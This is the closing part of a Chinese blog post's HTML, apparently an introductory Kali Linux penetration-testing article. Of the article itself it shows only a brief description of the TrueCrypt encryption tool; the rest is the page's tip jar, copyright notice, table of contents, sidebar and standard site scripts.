+<h3 id="Truecrypt"><a href="#Truecrypt" class="headerlink" title="Truecrypt"></a>Truecrypt</h3><p>TrueCrypt，是一款免费开源的加密软件，同时支持 Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt 不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持 FAT32 和 NTFS 分区、隐藏卷标、热键启动等。—-百度百科</p>
+<p>比较完整的使用教程：<a href="https://blog.csdn.net/chinajobs/article/details/45438343" target="_blank" rel="noopener">TrueCrypt中文教程</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>喜欢这篇文章？打赏一下作者吧！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="超超 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="超超 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>超超
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://xchcloud.cn/kali-linux渗透测试入门/" title="kali-linux渗透测试入门">http://xchcloud.cn/kali-linux渗透测试入门/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/入门/" rel="tag"><i class="fa fa-tag"></i> 入门</a>
+              <a href="/tags/渗透/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/心态再次变化，低沉/" rel="prev" title="心态再次变化，低沉">
+      <i class="fa fa-chevron-left"></i> 心态再次变化，低沉
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/高效学习之反思/" rel="next" title="高效学习之反思">
+      高效学习之反思 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="SOHUCS"></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Google-Hacking-Database"><span class="nav-text">Google Hacking Database</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Google-基本搜索语法"><span class="nav-text">Google 基本搜索语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Google-高级搜索语法"><span class="nav-text">Google 高级搜索语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具：NETCAT-NC"><span class="nav-text">工具：NETCAT-NC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TELNET-BANNER"><span class="nav-text">TELNET / BANNER</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#远程电子取证的收集"><span class="nav-text">远程电子取证的收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#传输⽂文件"><span class="nav-text">传输⽂文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#传输目录"><span class="nav-text">传输目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#加密传⽂文件"><span class="nav-text">加密传⽂文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#流媒体服务"><span class="nav-text">流媒体服务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#端口扫描"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#远程克隆硬盘或者内存"><span class="nav-text">远程克隆硬盘或者内存</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#远程控制"><span class="nav-text">远程控制</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#正向："><span class="nav-text">正向：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#反向："><span class="nav-text">反向：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NCAT"><span class="nav-text">NCAT</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WIRESHARK"><span class="nav-text">WIRESHARK</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#基本使⽤用⽅方法"><span class="nav-text">基本使⽤用⽅方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#筛选器"><span class="nav-text">筛选器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#常⻅见协议包"><span class="nav-text">常⻅见协议包</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#TCP"><span class="nav-text">TCP</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#数据流"><span class="nav-text">数据流</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#信息统计"><span class="nav-text">信息统计</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实践"><span class="nav-text">实践</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实践-1"><span class="nav-text">实践</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#TCPDUMP——抓包"><span class="nav-text">TCPDUMP——抓包</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程文档记录"><span class="nav-text">过程文档记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dradis"><span class="nav-text">Dradis</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#参考资料"><span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Truecrypt"><span class="nav-text">Truecrypt</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="超超"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">超超</p>
+  <div class="site-description" itemprop="description">那天早上雾散了，不止早上、不止雾。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">139</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">53</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">118</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lhc0101" title="Github → https://github.com/lhc0101" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Github</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/lhc0101" title="Gitee → https://gitee.com/lhc0101" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Gitee</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=qJmcmp_akJ6ZmZHo2dmGy8fF" title="E-mail → http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=qJmcmp_akJ6ZmZHo2dmGy8fF" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://Li-rr.github.io" title="https://Li-rr.github.io" rel="noopener" target="_blank">LRR</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">超超</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">592k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">8:58</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+<script src="/js/utils.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <script>
+  NexT.utils.loadComments(document.querySelector('#SOHUCS'), () => {
+    var appid = 'cyvEvEbk0';
+    var conf = '36cf39268529f13ea45698266acf4f47';
+    var width = window.innerWidth || document.documentElement.clientWidth;
+    if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>');
+    } else {
+      var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})});
+    }
+  });
+  </script>
+  <script src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+
+</body>
+</html>
